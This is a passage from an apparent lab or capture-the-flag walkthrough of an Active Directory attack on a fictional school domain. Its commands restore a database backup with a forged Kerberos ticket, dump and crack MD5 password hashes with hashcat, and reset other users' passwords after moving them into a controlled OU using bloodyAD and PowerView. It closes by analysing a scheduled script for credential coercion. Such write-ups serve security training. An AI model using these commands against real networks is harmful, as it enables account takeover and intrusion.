`RESTORE DATABASE` is executed by the **SQL Server engine**, not our client prompt, and the engine reads the backup off disk **as the service account** (`svc_mssql` here — proven by the [Section 9.3](#93-coercion-check--who-does-the-service-run-as) `xp_dirtree` callback). `C:\backup` is a restricted folder whose ACL doesn't grant that account read, so a direct `RESTORE ... FROM 'C:\backup\Westbridge.bak'` dies with **OS error 5 (Access is denied)**. Step one: copy it somewhere world-readable.

```powershell
PS > copy C:\Backup\Westbridge.bak C:\Users\Public\
```

We don't exfil the `.bak` — we're `sysadmin` on the instance (that's the whole point of the [Section 9.5](#953-forge-the-ticket) silver ticket), so we restore it locally and read the tables straight out. Reconnect over Kerberos with the forged silver ticket (the ccache, not the original TGT):

```bash
➜ env KRB5CCNAME=svc_mssql.ccache \
mssqlclient.py \
    'westbridge.hsm/svc_mssql@sql.westbridge.hsm' -k -no-pass
```

Before restoring, preview the backup's logical files — `RESTORE FILELISTONLY` lists the internal `.mdf`/`.ldf` names we must redirect with `WITH MOVE`:

```bash
SQL (WESTBRIDGE\svc_mssql  dbo@master)> RESTORE FILELISTONLY FROM DISK = 'C:\Users\Public\Westbridge.bak';

LogicalName      PhysicalName                                                                              Type   FileGroupName      Size       MaxSize   FileId   CreateLSN   DropLSN                               UniqueId   ReadOnlyLSN   ReadWriteLSN   BackupSizeInBytes   SourceBlockSize   FileGroupId   LogGroupGUID   DifferentialBaseLSN                   DifferentialBaseGUID   IsReadOnly   IsPresent   TDEThumbprint   SnapshotUrl
--------------   ---------------------------------------------------------------------------------------   ----   -------------   -------   -----------   ------   ---------   -------   ------------------------------------   -----------   ------------   -----------------   ---------------   -----------   ------------   -------------------   ------------------------------------   ----------   ---------   -------------   -----------
Westbridge       C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge.mdf       D      PRIMARY         8388608   35184372080640        1           0         0   5E15DE45-2E03-4DB6-ABA2-29FF45152434             0              0             2818048              4096             1           NULL                     0   00000000-0000-0000-0000-000000000000            0           1            NULL   NULL
Westbridge_log   C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_log.ldf   L      NULL            8388608   2199023255552        2           0         0   3D927A21-0A54-4071-9119-88CA96FE5B6B             0              0                   0              4096             0           NULL                     0   00000000-0000-0000-0000-000000000000            0           1            NULL   NULL
```

Two logical files: `Westbridge` (data, type `D`) and `Westbridge_log` (log, type `L`). Now restore to a **fresh database name** (`Westbridge_Restore`) rather than over the existing `Westbridge` — the live DB rejected `svc_mssql` in [Section 9.2](#92-mapping-the-instance), and a fresh copy sidesteps that lockout. Each logical file is redirected to a new path via `WITH MOVE`, and `REPLACE` overwrites any stub:

```bash
SQL (WESTBRIDGE\svc_mssql  dbo@master)> RESTORE DATABASE Westbridge_Restore FROM DISK = 'C:\Users\Public\Westbridge.bak' WITH MOVE 'Westbridge' TO 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_Restore.mdf', MOVE 'Westbridge_log' TO 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\Westbridge_Restore_log.ldf', REPLACE;

INFO(SQL): Line 1: Processed 360 pages for database 'Westbridge_Restore', file 'Westbridge' on file 1.
INFO(SQL): Line 1: Processed 2 pages for database 'Westbridge_Restore', file 'Westbridge_log' on file 1.
INFO(SQL): Line 1: RESTORE DATABASE successfully processed 362 pages in 0.482 seconds (5.859 MB/sec).
```

Restore succeeded. Switch into it with `USE`, then enumerate the tables — `INFORMATION_SCHEMA.TABLES` lists what we can now read:

```bash
SQL (WESTBRIDGE\svc_mssql  dbo@master)> USE Westbridge_Restore;
ENVCHANGE(DATABASE): Old Value: master, New Value: Westbridge_Restore

SQL (WESTBRIDGE\svc_mssql  dbo@Westbridge_Restore)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
TABLE_NAME
---------------
LearningContent
StudentFinance
SQLManagement
```

---

# 10. Credentials in the Database

The `Westbridge_Restore` database holds three tables, and `SQLManagement` is the interesting one — a maintenance-account register that maps **domain** identities to passwords. These aren't just SQL logins; they're the same accounts that log into the domain, which is what makes the table a credential store rather than a DB config. Pulling it:

```bash
SQL (WESTBRIDGE\svc_mssql  dbo@Westbridge_Restore)> SELECT * FROM SQLManagement;

EntryID   Username     Password                           Role                DatabaseName   DefaultSchema   LastLogin   AccountStatus   Notes
-------   ----------   --------------------------------   -----------------   ------------   -------------   ---------   -------------   ---------------------------------------------------------------------------
      1   m.thompson   3cc31cd246149aec68079241e71e98f6   SQL Administrator   Westbridge     dbo             NULL        Enabled         Westbridge MSSQL management account record. No password stored in database.
      2   j.walsh      d75b2e8cbad743869717c06d7049efc9   Database Operator   Westbridge     dbo             NULL        Enabled         Operational database account record. Password field intentionally empty.
```

Both password fields are MD5 hashes — and the "no password stored" / "intentionally empty" notes are misdirection: the hash column is plainly populated. `hashcat -m 0` against rockyou cracks `m.thompson` instantly:

```bash
➜ hashcat -a 0 -m 0 /tmp/hashes.txt /opt/SecLists/rockyou.txt

➜ hashcat -a 0 -m 0 /tmp/hashes.txt --show
3cc31cd246149aec68079241e71e98f6:Pa$$w0rd
```

And look who that is: **m.thompson — IT Tier1 Support and MSSQL Maintenance, the same identity the People Directory had flagged as an administrator.** The human we were hunting in [Section 9.4](#94-the-prize--westbridgemssql-maintenance) just handed us his password through his own management records. (`j.walsh`'s hash still pending crack.)

---

# 11. Mapping the OUs — Who Lives Where

With m.thompson's password in hand, it's worth stepping back and reading the domain's organizational structure properly. The BloodHound graphs in this section come from the single domain-wide collection we ran as `svc_mssql` back in [Section 7.3](#73-bloodhound-collection) — that dump already surfaces both the OU rosters (who lives in IT TIER1, IT TIER2, IT TIER3, and STUDENTS) *and* m.thompson's own group memberships and outbound edges. A domain user's own object is readable by any authenticated principal, so there's no need to re-run BloodHound as m.thompson; the [Section 7.3](#73-bloodhound-collection) data already contains his picture. We show that picture in [Section 11.1](#111-the-mthompson-picture) now because it's the key to the next move.

BloodHound's OU view is the map of *who lives where*:

![BloodHound — full OU structure](/assets/images/westbridge-bh-ou-structure.png)

The full graph also shows cross-forest principals, service accounts, and domain controllers — but the three-tier IT hierarchy plus the student population is where the exploitation story plays out.

## 11.1 The m.thompson Picture

![BloodHound — m.thompson group memberships](/assets/images/westbridge-bh-mthompson-membersof.png)

| Group | Meaning |
|---|---|
| IT TIER1 SUPPORT | day-to-day ops identity |
| MSSQL MAINTENANCE | sysadmin on SQL (confirmed in practice [Section 9.4](#94-the-prize--westbridgemssql-maintenance) |
| STUDENT ACCOUNT ADMINISTRATORS | *manages student accounts* |

These are **m.thompson's group memberships** — not the OU roster. The three OUs below (IT TIER1/2/3) each carry their own populations; this table is just the identity sitting in IT TIER1.

Outbound object control (the interesting part):

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

**GenericAll over the whole STUDENTS OU** — which inherits down to every account inside. In AD, `GenericAll` on an OU = reset any member's password (`ForceChangePassword`-equivalent), set SPNs/keyCredentials, move objects in/out, write any attribute. That's the wedge we exploit in a moment.

With GenericAll over the STUDENTS OU, m.thompson can move any object in or out of that OU — including users from other tiers. The two Tier-1 operators we'll relocate into STUDENTS territory (both about to get moved into space we already own):

* **r.anderson** ➜ File Server Support ➜ the **Scripts** share on FILES that `svc_mssql` couldn't touch (`IT-Share` is locked tighter — that one comes later, via a different path)
* **c.wilson** ➜ Account Policy Administrators ➜ can write *account-policy attributes* on IT-Tier members (the logonHours reset we'll pull off in Section [15.3](#153-why-invalid-logon-hours--time-based-access-control) runs through this group)

### 11.1.1 IT TIER1 — the operators

![BloodHound — IT TIER1 OU](/assets/images/westbridge-bh-ou-it-tier1.png)

The IT TIER1 OU contains two user accounts: **r.anderson** and **c.wilson** — the BloodHound graph above shows exactly those two. (m.thompson isn't shown as a child of this OU because his account lives in a different container; his group memberships, including IT TIER1 SUPPORT, are what put him in the tier and are broken out separately in [Section 11.1](#111-the-mthompson-picture).)

The two accounts the graph surfaces as Tier1 neighbors:

![BloodHound — r.anderson memberof](/assets/images/westbridge-bh-randerson-memberof.png)
![BloodHound — c.wilson memberof](/assets/images/westbridge-bh-cwilson-memberof.png)

* **r.anderson** — Member of the **File Server Support Group** — runs the Scripts share on FILES
* **c.wilson** — Member of the **Account Policy Administrators Group** — writes account-policy attributes (e.g. logonHours) on members; the actual exploitation comes in Section [15.3](#153-why-invalid-logon-hours--time-based-access-control).

m.thompson is also a Tier1 operator (his full group memberships are broken out in [Section 11.1](#111-the-mthompson-picture) — and he holds **GenericAll over the entire STUDENTS OU**, which is the wedge we exploit in a moment). Tier1 = the people who run day-to-day services — file servers and databases.

### 11.1.2 IT TIER2 — the provisioners

![BloodHound — IT TIER2 OU](/assets/images/westbridge-bh-ou-it-tier2.png)

The IT TIER2 OU contains three human provisioners — the BloodHound graph above surfaces exactly those three: **b.wellington**, **c.anderson**, and **s.harrison**. There's also a non-human actor with reach into this tier: **`svc_krb_t2`**, a Tier-2 provisioning service account that holds **GenericAll over the IT TIER2 OU** (the account layer that creates and manages these identities). Its graph and abuse path are the deep-dive in [Section 15.2](#152-svc_krb_t2-mints-itself-an-ou).

The three provisioners who staff this tier:

* **b.wellington** — Tier 2 provisioner
* **c.anderson** — Tier 2 provisioner
* **s.harrison** — Tier 2 provisioner (helpdesk-level; his restricted logon hours become relevant in [Section 15.3](#153-why-invalid-logon-hours--time-based-access-control), and his group memberships are broken out in [Section 15.5](#155-who-is-sharrison)

### 11.1.3 IT TIER3 — the admins

![BloodHound — IT TIER3 OU](/assets/images/westbridge-bh-ou-it-tier3.png)

The IT TIER3 OU contains three admins — the BloodHound graph above shows exactly those three: **a.owen**, **b.jones**, and **d.hoff**.

The three admins who staff this tier:

![BloodHound — a.owen memberof](/assets/images/westbridge-bh-aowen-memberof.png)

* **a.owen** — Member of the **CA-Manager Group** — controls the enterprise CA that signs every TLS cert in the domain. We explain the full CA-Manager exploitation path (ESC4 on the certificate template, ESC4 ➜ privileged certificate ➜ DC compromise) in [Section 17](#17-privesc-dc01--esc4-on-the-ca).
* **b.jones** — Domain Users only — no special groups.
* **d.hoff** — Domain Users only — no special groups.

The external controller for this tier — the account that holds GenericAll over IT TIER3 — isn't visible in the OU graph above. It's flagged as an anomaly in [Section 8.4](#84-non-default-acl-edges) (RID 9510) and resolved in [Section 16.4](#164-jdillon-it-tier3-aowen): it turns out to be **j.dillon**, an AD tombstone we revive. The full Tier-3 exploitation chain (j.dillon's GenericAll ➜ a.owen's password reset ➜ CA administration) is covered there.

Tier 3 is the CA's front door. We keep it simple here and come back for the full chain later.

### 11.1.4 STUDENTS — the target-rich environment

![BloodHound — Students OU](/assets/images/westbridge-bh-ou-students.png)

A dozen-plus student accounts — and per our earlier ACL mining, **m.thompson has GenericAll over this entire OU**. GenericAll on an OU inherits down to every account inside: password resets, SPN/keyCredential writes, object moves, arbitrary attribute writes. That's not a detail; that's a weapon. We break down exactly what m.thompson can do with it in [Section 11.1](#111-the-mthompson-picture).

## 11.2 Execution — Rights Live on Containers, Not People

> Active Directory rule of thumb: Rights live on containers, not people. If you can't hack the user, just pick up their house and move it somewhere you control.

First, validate the cracked password estate-wide (the BloodHound data from [Section 7.3](#73-bloodhound-collection) already covers m.thompson's perspective, so no re-collection is needed):

```bash
➜ nxc smb 10.0.10.0/24 \
    -u 'm.thompson' -p 'Pa$$w0rd'

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\m.thompson:Pa$$w0rd
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\m.thompson:Pa$$w0rd
```

Password estate-wide: `Pa$$w0rd` authenticates to both FILES and DC. We don't need a fresh BloodHound collection here — the [Section 7.3](#73-bloodhound-collection) dump already captured m.thompson's group memberships and outbound edges, since a domain user's own object is readable by any authenticated principal. What we *do* need is the raw ACL on the OU itself, which BloodHound abstracts away; that's why we go straight to PowerView/bloodyAD below to read the exact ACEs m.thompson holds on IT TIER1:

Before touching anything, dump the ACLs on the IT TIER1 OU — and here's the twist that makes this lab clever. m.thompson does **not** hold GenericAll there:

```bash
➜ powerview \
    westbridge.hsm/m.thompson:'Pa$$w0rd'@dc.westbridge.hsm

╭─LDAPS─[DC.westbridge.hsm]─[WESTBRIDGE\m.thompson]-[NS:<auto>]
╰─ ❯ Get-DomainObjectAcl "OU=IT Tier1,DC=westbridge,DC=hsm" -ResolveGUIDs
ObjectDN            : OU=IT Tier1,DC=westbridge,DC=hsm
AccessControlType   : AccessAllowed
AceType             : ACCESS_ALLOWED_OBJECT_ACE
AccessMask          : WriteProperty
ObjectAceType       : RDN                    🡐 rename user objects
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson

....
ObjectAceType       : Common-Name            🡐 rename user objects
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson
....
ObjectAceType       : Public-Information     🡐 write limited properties
InheritanceType     : ContainerInherit, InheritOnly
SecurityIdentifier  : WESTBRIDGE\m.thompson
....
ObjectDN            : OU=IT Tier1,DC=westbridge,DC=hsm
AccessControlType   : AccessAllowed
AceType             : ACCESS_ALLOWED_OBJECT_ACE
AccessMask          : DeleteChild            🡐 remove objects from the OU
SecurityIdentifier  : WESTBRIDGE\m.thompson
```

Three WriteProperty ACEs (RDN, Common-Name, Public-Information) let m.thompson rename users and tweak a few attributes — but the real mover is the fourth entry: **DeleteChild on the OU itself**. That's the permission that lets him pull objects out of IT Tier1. Powerview surfaces it cleanly because `-ResolveGUIDs` translates the GUIDs; the raw SDDL (what you'd get from `bloodyAD get object --attr nTSecurityDescriptor`) is the same ACEs but as hex masks and OID strings.

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    get object 'OU=IT Tier1,DC=westbridge,DC=hsm' \
    --attr nTSecurityDescriptor

distinguishedName: OU=IT Tier1,DC=westbridge,DC=hsm
nTSecurityDescriptor: O:...G:...D:AI(D;;0x10040;;;S-1-1-0)
  (OA;CIIO;WP;bf967a0e...;bf967aba...;S-1-5-21-...-1103)    🡐 RDN / rename
  (OA;CIIO;WP;bf96793f...;bf967aba...;S-1-5-21-...-1103)    🡐 Common-Name
  (OA;CIIO;WP;e48d0154...;bf967aba...;S-1-5-21-...-1103)    🡐 Public-Information
  (OA;CIIO;SD;;bf967aba...;S-1-5-21-...-1103)               🡐 Standard Delete (delete the object itself)
  (A;;DC;;;S-1-5-21-...-1103)                               🡐 DeleteChild (delete child objects)
  (A;;0xf01ff;;;S-1-5-21-...-1103)(A;;0x20094;;;S-1-5-9)...
```

Same ACEs Powerview surfaced just above, just in raw SDDL instead of `-ResolveGUIDs`-decoded form. The meaningful pieces:

- `D:AI(...)` — the DACL; `AI` is the DACL's auto-inherit flag. The individual ACEs carry their own inheritance bits: the WriteProperty ACEs are marked `CIIO` (container-inherit + inherit-only), so they flow down into IT Tier1's contents but aren't exercised on the OU object itself.
- `WP;bf967a0e` / `WP;bf96793f` / `WP;e48d0154` — WriteProperty on RDN, Common-Name, and Public-Information, i.e. rename and tweak a few attributes on the users inside.
- `SD;;bf967aba` — DeleteChild on the OU (no inherit-only flag — applies to the OU object itself), which is what lets m.thompson pull objects out of IT Tier1 (the move primitive PowerView's `Set-DomainObjectDN` uses under the hood).
- `A;;DC` — Delete on the OU as well (also not inherit-only); reinforced delete path.
- `0xf01ff` — FullControl mask on a couple of well-known SIDs (domain admins, system, etc.), the normal "admins own this" entries.

Powerview is the readable layer; bloodyAD's SDDL is the ground truth. They describe the same three WriteProperty ACEs plus DeleteChild — the IT Tier1 ACLs that stop m.thompson one step short of a password reset.

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    get writable

distinguishedName: CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm
permission: WRITE
....
distinguishedName: OU=STUDENTS,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

`WRITE` on r.anderson and c.wilson bundles the rename + move rights. `CREATE_CHILD; WRITE` plus `OWNER: WRITE` and `DACL: WRITE` on STUDENTS is full control — that's the GenericAll inheritance we spotted in [Section 8.4](#84-non-default-acl-edges).

Rename, move, delete — but **no password-reset right yet**. The WriteProperty ACEs let m.thompson rename users and tweak a few attributes; they don't let him reset passwords. The move itself is a single LDAP operation: rewrite the user's `distinguishedName` and AD treats it as a move, removing the object from the source and recreating it in the destination. That operation is gated by the DC checking that the caller holds DeleteChild on the source container **and** CreateChild on the destination. m.thompson has both ends of that transaction: DeleteChild on IT Tier1, and CreateChild (inherited from GenericAll) on STUDENTS. So the same `distinguishedName` write that was blocked for password-reset purposes in IT Tier1 now goes through — because the move drops the targets under an OU whose ACLs actually permit the subsequent `unicodePwd` write, not because relocation by itself confers password rights.

### 11.2.1 Move the target users into STUDENTS

The first move rewrites the user's `distinguishedName` in-place on the DC. We tell bloodyAD which object to patch, which attribute to set, and the new DN that drops it into `OU=Students`. For r.anderson:

```bash
➜ bloodyad --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set object 'CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm' \
    distinguishedName -v 'CN=r.anderson,OU=Students,DC=westbridge,DC=hsm'

[+] CN=r.anderson,OU=IT Tier1,DC=westbridge,DC=hsm's distinguishedName has been updated
```

That one command does the source-side deletion: AD treats the `distinguishedName` change as a move, so the object is removed from `OU=IT Tier1` and recreated under `OU=Students` — exactly the DeleteChild + CreateChild transaction the IT Tier1 / STUDENTS ACLs permit. The `-v` value is the full new DN, not just the OU; the object's CN stays the same, only its location changes.

Same shape for c.wilson, second command in its own block:

```bash
➜ bloodyad --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set object 'CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm' \
    distinguishedName -v 'CN=c.wilson,OU=Students,DC=westbridge,DC=hsm'

[+] CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm's distinguishedName has been updated
```

Both users are now children of `OU=Students`, which means m.thompson's GenericAll inherits down onto each of them as FullControl — including the right to write `unicodePwd`.

> **Alternative — PowerView `Set-DomainObjectDN`** wraps the same `distinguishedName` rewrite in one call per user, with a built-in check that the caller holds DeleteChild on the source *and* CreateChild on the destination (the same two-sided requirement bloodyAD's `set object` only enforces at the DC). It's the safer default when you're not certain both ends of the transaction are in hand:
>
> ```bash
> ╭─LDAPS─[DC.westbridge.hsm]─[WESTBRIDGE\m.thompson]-[NS:<auto>]
> ╰─ ❯ Set-DomainObjectDN -Identity r.anderson \
>     -DestinationDN 'OU=Students,DC=westbridge,DC=hsm'
>
>    ❯ Set-DomainObjectDN -Identity c.wilson \
>     -DestinationDN 'OU=Students,DC=westbridge,DC=hsm'
>
> [+] Success! modified new dn for CN=c.wilson,OU=IT Tier1,DC=westbridge,DC=hsm
> ```

The instant they land under `OU=Students`, m.thompson's **GenericAll inherits down as FullControl onto each of them** — which covers writing `unicodePwd`. Now the resets work.

### 11.2.2 Reset the passwords — bloodyAD

First reset: r.anderson. The command targets the user by sAMAccountName, takes the new password as the next argument, and writes `unicodePwd` on the object now sitting in STUDENTS:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set password 'r.anderson' 'SecretMyth123!'

[+] Password changed successfully!
```

Second reset: c.wilson, same shape, next command:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u 'm.thompson' -p 'Pa$$w0rd' \
    set password 'c.wilson' 'SecretMyth123!'

[+] Password changed successfully!
```

`set password` is the bloodyAD verb that writes `unicodePwd` — the attribute a password reset actually touches. It only succeeds because the caller holds a write right on the object, which inside IT Tier1 m.thompson didn't have. Once the users are relocated into STUDENTS, the inherited GenericAll gives him that write right (in this environment the OU-level GenericAll is enough to write `unicodePwd` on the now-descendant objects; that's not automatic from OU inheritance alone in every domain — deny ACEs, protected groups, or per-object ACLs can still block the reset even after a successful move).

Two target users relocated, zero password-guessing:

* **r.anderson** — File Server Support ➜ should unlock the `Scripts` share
  that rejected every account we own (the `IT-Share` only opens later, at [Section 14.1](#141-the-ssh-key-sitting-in-the-backup), once we hold local admin on FILES)
* **c.wilson** — Account Policy Administrators ➜ account-policy control for later abuse

The whole stage is one idea: **ACLs attach to containers and inherit downward.** You don't always need to escalate *against* an object — sometimes you just relocate the object into territory you already own.

---

# 12. FILES — The Scripts Share

## 12.1 Enumeration as r.anderson

### 12.1.1 Port Scan — FILES (10.0.10.15)

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: FILES
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: FILES.westbridge.hsm
|   DNS_Tree_Name: westbridge.hsm
|   Product_Version: 10.0.26100
...
| ssl-cert: Subject: commonName=FILES.westbridge.hsm
| Issuer: commonName=FILES.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T19:53:42
| Not valid after:  2027-01-01T19:53:42
| MD5:   73cd 6957 19fc b4e8 3664 93aa 8924 ea2f
|_SHA-1: a806 59e5 b095 a802 19df 72a5 3105 a03d 699f f84d
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
```

Check Creds:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!'

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
```

The reset paid for itself immediately — `File Server Support` opens the share that rejected every account we owned:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
     --shares

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Enumerated shares
SMB         10.0.10.15      445    FILES            Share           Permissions            Remark
SMB         10.0.10.15      445    FILES            -----           -----------            ------
SMB         10.0.10.15      445    FILES            ADMIN$                                 Remote Admin
SMB         10.0.10.15      445    FILES            C$                                     Default share
SMB         10.0.10.15      445    FILES            IPC$            READ                   Remote IPC
SMB         10.0.10.15      445    FILES            IT-Share                               IT Internal - Administrators Only
SMB         10.0.10.15      445    FILES            Scripts         READ                   File Server Support members only
SMB         10.0.10.15      445    FILES            Students        READ                   Public student resources and academic documents
```

`spider_plus` over the readable shares: 15 files, 13 of them noise (campus PDFs, pictures, even Procmon/VS installers under `Students\Tools`). But `Scripts\` holds exactly two PowerShell scripts — and one of them is the next stage of this lab:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --shares -M spider_plus

SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SPIDER_PLUS 10.0.10.15      445    FILES            [+] Saved share-file metadata to "/home/deus/.nxc/modules/nxc_spider_plus/10.0.10.15.json".
SPIDER_PLUS 10.0.10.15      445    FILES            [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT-Share, Scripts, Students)
SPIDER_PLUS 10.0.10.15      445    FILES            [*] SMB Readable Shares:  3 (IPC$, Scripts, Students)
SPIDER_PLUS 10.0.10.15      445    FILES            [*] Total files found:    15
```

```bash
➜ cat /home/deus/.nxc/modules/nxc_spider_plus/10.0.10.15.json
{
    "Scripts": {
        "installed_updates.ps1": {
            "atime_epoch": "2026-07-07 20:19:02",
            "ctime_epoch": "2026-07-07 20:19:02",
            "mtime_epoch": "2026-07-07 20:19:02",
            "size": "998 B"
        },
        "webserver_monitor.ps1": {
            "atime_epoch": "2026-07-07 22:02:00",
            "ctime_epoch": "2026-07-07 20:17:14",
            "mtime_epoch": "2026-07-07 22:02:00",
            "size": "1.05 KB"
        }
    }
}
```

The JSON covers two readable shares — `Scripts` (2 files, both PowerShell) and `Students` (13 files of campus PDFs, pictures, and Procmon/VS installers — all noise). The only files that matter are the two in `Scripts`:

The `nxc smb ... --get-file` syntax is `<remote-name> <local-name>`: it authenticates with r.anderson's creds, targets the `Scripts` share, and pulls the named file down to our working directory. We use it to retrieve both PowerShell scripts for inspection:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --share 'Scripts' \
    --get-file installed_updates.ps1 installed_updates.ps1

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Copying "installed_updates.ps1" to "installed_updates.ps1"
SMB         10.0.10.15      445    FILES            [+] File "installed_updates.ps1" was downloaded to "installed_updates.ps1"
```

The second download is the same operation against the other script — same share, same creds, only the filename changes:

```bash
➜ nxc smb files.westbridge.hsm \
    -u 'r.anderson' -p 'SecretMyth123!' \
    --share 'Scripts' \
    --get-file webserver_monitor.ps1 webserver_monitor.ps1

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\r.anderson:SecretMyth123!
SMB         10.0.10.15      445    FILES            [*] Copying "webserver_monitor.ps1" to "webserver_monitor.ps1"
SMB         10.0.10.15      445    FILES            [+] File "webserver_monitor.ps1" was downloaded to "webserver_monitor.ps1"
```

* `installed_updates.ps1` — decoy; plain `Get-HotFix` reporting
* **`webserver_monitor.ps1`** — gold

## 12.2 webserver_monitor.ps1 — A Coercion Machine, Delivered by the Lab

```powershell
# installed_updates.ps1
# Lists installed Windows updates

$OutputFile = "$env:TEMP\installed_updates.txt"

"===================================" | Out-File $OutputFile
" Installed Windows Updates" | Out-File $OutputFile -Append
" Generated: $(Get-Date)" | Out-File $OutputFile -Append
"===================================" | Out-File $OutputFile -Append
"" | Out-File $OutputFile -Append

try {
    Get-HotFix |
        Sort-Object InstalledOn -Descending |
        Select-Object HotFixID,
                      Description,
                      InstalledBy,
                      InstalledOn |
        Format-Table -AutoSize |
        Out-String |
        Out-File $OutputFile -Append

    Write-Host "Installed updates have been saved to:" -ForegroundColor Green
    Write-Host "  $OutputFile" -ForegroundColor Cyan
}
catch {
    Write-Host "Failed to retrieve installed updates." -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}
```

```powershell
# webserver_monitor.ps1

# Check web server status. Scheduled to run every 1min
# Service Account: svc_webmonitor

Write-Host "Web Server Monitoring - Service Account: svc_webmonitor" -ForegroundColor Cyan

$targets = @(
    "webstatus.westbridge.hsm",
    "webportal.westbridge.hsm",
    "webmonitor.westbridge.hsm"
)

foreach ($target in $targets) {
    try {
        Write-Host "Checking: $target" -ForegroundColor Gray

        $request = Invoke-WebRequest `
            -Uri "http://$target" `
            -UseDefaultCredentials `
            -UseBasicParsing `
            -TimeoutSec 3

        if ($request.StatusCode -ne 200) {
            Write-Host "  Warning: $target returned status: $($request.StatusCode)" -ForegroundColor Yellow
        }
        else {
            Write-Host "  Status: 200 - OK" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "  Error: Failed to connect to $target" -ForegroundColor Red
    }
}

Write-Host "Monitoring completed - Service: svc_webmonitor" -ForegroundColor Cyan
```

Three facts stacked:

1. It runs **every 60 seconds**, scheduled, as **`svc_webmonitor`** — the account BloodHound flagged with **AddKeyCredentialLink on `svc_files`** ([Section 8.4](#84-non-default-acl-edges). That was always the designed chain: own `svc_webmonitor` ➜ Shadow Credential on `svc_files` ➜ S4U constrained delegation ➜ SYSTEM-equivalent on FILES.
2. `-UseDefaultCredentials` attaches the running account's Negotiate/NTLM auth to every HTTP request. Whoever answers receives `svc_webmonitor`'s authentication material.
3. The three targets are **FQDNs** — so classic LLMNR/NBNS poisoning won't fire (Windows resolves them via DNS, no broadcast fallback). We must control what DNS says.

## 12.3 The Account Behind the Script — svc_webmonitor

The script header says `Service Account: svc_webmonitor`, but BloodHound's graph for the *owning* account — the one with the AddKeyCredentialLink edge that makes this whole chain worthwhile — is worth seeing now rather than waiting for Section 13. Two images, both already introduced in [Section 8.4](#84-non-default-acl-edges) but central enough to repeat here:

